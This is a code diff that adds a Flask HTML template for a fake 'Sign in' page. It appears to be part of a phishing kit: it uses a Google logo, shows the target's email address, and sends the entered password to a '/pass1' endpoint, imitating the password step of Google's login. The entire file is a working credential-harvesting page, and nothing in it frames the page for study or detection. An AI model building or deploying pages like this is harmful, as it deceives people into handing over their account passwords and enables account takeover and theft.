@@ -1,0 +1,38 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <body>
+    
+<div class="background-image"></div>
+  <style>@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@500&display=swap');
+
+</style>
+
+  
+    <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+
+      <title>Sign in</title>
+      <link rel="stylesheet" href="{{ url_for('static', filename='pass.css') }}">
+      <link rel="icon" type="image/png" href="{{ url_for('static', filename='icon.png') }}">
+    </head>
+    
+   <div class="login-box">
+     
+     <img src="{{ url_for('static', filename='google.jpg') }}">
+     
+     <h1>Sign in</h1>
+     <x1>{{ email }}</x1>
+     <form method="post" action="/pass1">
+     <input type="password" id="password" name="password" placeHolder="Password" required>
+     <br>
+     
+     <x2> Forgot password?</x2>
+      
+    <button type="submit"> Next </button>
+    </form>
+    </div>
+
+
+  </body>
+</html>
